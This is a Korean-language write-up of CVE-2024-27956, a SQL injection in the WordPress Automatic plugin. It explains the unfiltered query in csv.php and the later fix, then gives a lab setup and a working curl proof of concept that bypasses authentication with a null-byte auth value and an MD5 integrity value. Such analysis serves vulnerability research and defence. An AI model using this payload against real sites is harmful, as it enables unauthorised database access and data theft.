# CVE-2024-27956

## Index
* [📝 Analysis](#-analysis)
    * [1. 개요](#1-개요)
    * [2. 발생 원인](#2-발생-원인)
    * [3. 패치 확인](#3-패치-확인)
* [🔫 PoC](#-PoC)
    * [1. 환경 셋팅(Automatic 3.92.0 설치)](#1-환경-셋팅automatic-3920-설치)
    * [2. 익스플로잇](#2-익스플로잇)


## 📝 Analysis

### 1. 개요

`CVE-2024-27956` 은 WordPress의 `Automatic` 플러그인에서 발견된 SQL Injection 취약점으로, 버전 3.92.0 이하에서 영향을 받습니다.

`Automatic` 플러그인은 ChatGPT, 유튜브, 아마존, 트위터, 페이스북 등 여러 플랫폼과 통합되어, 해당 플랫폼의 콘텐츠를 자동으로 수집하고 게시할 수 있는 플러그인입니다. 

예를 들어, ChatGPT를 이용한 포스팅 자동화를 다음과 같이 등록할 수 있습니다.

![image-001](images/image-001.png)

### 2. 발생 원인

WordPress의 `Automatic` 플러그인을 이용하여 콘텐츠를 수집하거나 게시하는 기능을 이용할 경우 로그 기록이 다음과 같이 로그 페이지(`/wp-admin/edit.php?post_type=wp_automatic&page=gm_log`) 쌓이게 됩니다. 

![image-002](images/image-002.png)

또한, `Automatic` 버전 3.92.0 이하에서는 로그 페이지 하단에 존재하는 버튼(`Download CSV Report for shown results`)을 클릭하여 로그 기록을 CSV 파일로 받아올 수 있습니다.

![image-003](images/image-003.png)

해당 버튼의 HTML 요소를 살펴보면 아래와 같이 정의되어 있습니다.

![image-004](images/image-004.png)

즉, 폼 태그를 이용하여 URL `/wp-content/plugins/wp-automatic/inc/csv.php` 로 POST 요청을 수행하며, 요청 시 아래의 페이로드를 함께 요청하고 있습니다.

| name | value |
| :---: | :--- |
| `q` | `SELECT * FROM wp_automatic_log  ORDER BY id DESC  limit 100`  |
| `auth` | `$P$BdQ8h4D6PqpeGNA8xBFBeeVyqq3BQY/` |
| `integ` | `9de25adaed040a56ea97546e9352356a` |

이때, 요청 URL `/wp-content/plugins/wp-automatic/inc/csv.php` 에 정의된 코드를 살펴보면, 페이로드 `q`로 전달되는 SQL 질의문이 어떠한 필터링도 거치지 않고 데이터베이스에 직접 질의되는 것을 확인할 수 있습니다.

![image-005](images/image-005.png)

따라서, 로그 기록을 CSV 파일로 저장할 때 사용자(클라이언트)로부터 SQL 질의문을 직접 받아 처리하고 있습니다. 이 과정에서 해당 SQL 질의문에 대한 어떠한 필터링도 수행되지 않아 SQL Injection 취약점이 발생하게 됩니다.

### 3. 패치 확인

`Automatic` 플러그인은 유료 플러그인이라 패치된 버전(3.92.1 이후)에 대한 코드 변경 이력을 확인할 수 없습니다.

다만, 인터넷상에 공개된 버전(3.106.0)을 확인한 결과, 로그 페이지에서 로그 기록을 CSV 파일로 저장하는 버튼이 제거된 것을 확인할 수 있었습니다.

![image-006](images/image-006.png)

![image-007](images/image-007.png)

또한, SQL Injection 취약점이 발생한 URL 경로 `/wp-content/plugins/wp-automatic/inc/csv.php`의 해당 파일이 삭제된 것을 확인할 수 있었습니다.

## 🔫 PoC

### 1. 환경 셋팅(Automatic 3.92.0 설치)

`CVE-2024-27956` 의 PoC 환경 구성을 위해 아래의 명령을 입력합니다.

```bash
# 저장소 클론
$ git clone -b CVE-2024-27956 https://github.com/DoTTak/Research-WordPress.git CVE-2024-27956
```

이후 WordPress 관리 페이지의 플러그인 추가 페이지(`/wp-admin/plugin-install.php`)로 이동합니다.

![image-008](images/image-008.png)

그 다음 `파일 선택` 버튼을 클릭하여 조금 전 내려받은 저장소에 존재하는 압축 파일(`CVE-2024-27956/plugins/WP-Automatic-3.92.0.zip`)을 업로드합니다.

![image-009](images/image-009.png)

업로드가 완료되면 `지금 설치` 버튼을 클릭하여 플러그인을 설치합니다. 설치가 완료된 후 '플러그인 활성화' 버튼을 클릭하여 `Automatic` 플러그인을 활성화합니다.

![image-010](images/image-010.png)

![image-011](images/image-011.png)

플러그인이 정상적으로 설치 완료 됐으면 아래와 같이 좌측 사이드 메뉴에 `Automatic` 플러그인 메뉴가 등장합니다.

![image-012](images/image-012.png)

### 2. 익스플로잇

위 과정을 통해 `Automatic` 플러그인 설치를 완료하고 활성화 한 뒤, 아래의 명령어를 입력합니다.

> `WordPress URL 주소` 란에 자신의 WordPress 주소를 입력합니다.
> 

```bash
curl -X POST <WordPress URL 주소>/wp-content/plugins/wp-automatic/inc/csv.php \
  -d "q=SELECT 'CVE-2024-27956 Exploit' as action, @@VERSION as data, '2024-11-5 04:49:51' as date" \
  -d "auth=%00" \
  -d "integ=c66b4ac73975004d6b788d1ae833ea1e" # integ의 값은 q를 md5 해시한 값
```

위 명령어에서 페이로드 `q` 에 입력된 SQL 질의문은 아래와 같습니다.

![image-013](images/image-013.png)

따라서, 위 명령어를 입력할 경우 최종적으로 아래와 같이 SQL Injection 취약점이 발생되는 것을 확인할 수 있습니다.

![image-014](images/image-014.png)